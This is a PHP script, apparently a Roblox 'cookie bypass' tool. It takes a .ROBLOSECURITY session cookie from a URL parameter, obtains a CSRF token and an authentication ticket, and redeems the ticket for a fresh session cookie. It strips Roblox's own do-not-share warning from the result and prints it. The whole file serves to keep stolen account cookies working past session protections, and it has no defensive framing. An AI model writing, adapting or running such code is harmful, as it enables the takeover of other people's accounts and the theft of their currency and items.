<?php
$cookie = $_GET['cookie'];
function getCsrfToken($cookie) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Cookie: .ROBLOSECURITY=$cookie",
        "Content-Length: 0",
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    $lines = explode(PHP_EOL, $response);
    foreach ($lines as $line) {
        if (strpos($line, 'x-csrf-token:') !== false) {
            $token = trim(str_replace('x-csrf-token:', '', $line));
            return $token;
        }
    }
    return null;
}

function rbxTicket($cookie, $token) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "origin: https://www.roblox.com",
        "Referer: https://www.roblox.com/games/2788229376/Da-Hood-RUBY",
        "x-csrf-token: " . $token,
        "Cookie: .ROBLOSECURITY=$cookie"
    ));
    $output = curl_exec($ch);
    curl_close($ch);

    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $header = substr($output, 0, $header_size);

    foreach (explode("\r\n", $header) as $line) {
        if (strpos($line, 'rbx-authentication-ticket:') !== false) {
            return trim(str_replace('rbx-authentication-ticket:', '', $line));
        }
    }
    return null;
}

function BypassCookieV2Old($cookie, $ticket, $token){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/redeem");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array("authenticationTicket" => $ticket)));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Type: application/json",
        "origin: https://www.roblox.com",
        "Referer: https://www.roblox.com/games/2788229376/Da-Hood-RUBY",
        "x-csrf-token: " . $token,
        "RBXAuthenticationNegotiation: 1"
    ));
    $output = curl_exec($ch);
    if (curl_errno($ch)) {
        die(curl_error($ch));
    }
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $header = substr($output, 0, $header_size);
    $body = substr($output, $header_size);
    $Bypassed = explode(";", explode(".ROBLOSECURITY=", $output)[1])[0];
    curl_close($ch);
    if(empty($Bypassed)){
        return $cookie;
    }else{
        return $Bypassed; 
    }
}

$token = getCsrfToken($cookie);
if ($token !== null) {
    $ticket = rbxTicket($cookie, $token);
    if ($ticket !== null) {
        $bypassed = BypassCookieV2Old($cookie, $ticket, $token);
        $refresh = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $bypassed);
        echo $refresh;
    } else {
        echo "Authentication ticket not found.";
    }
} else {
    echo "CSRF token not found.";
}
?>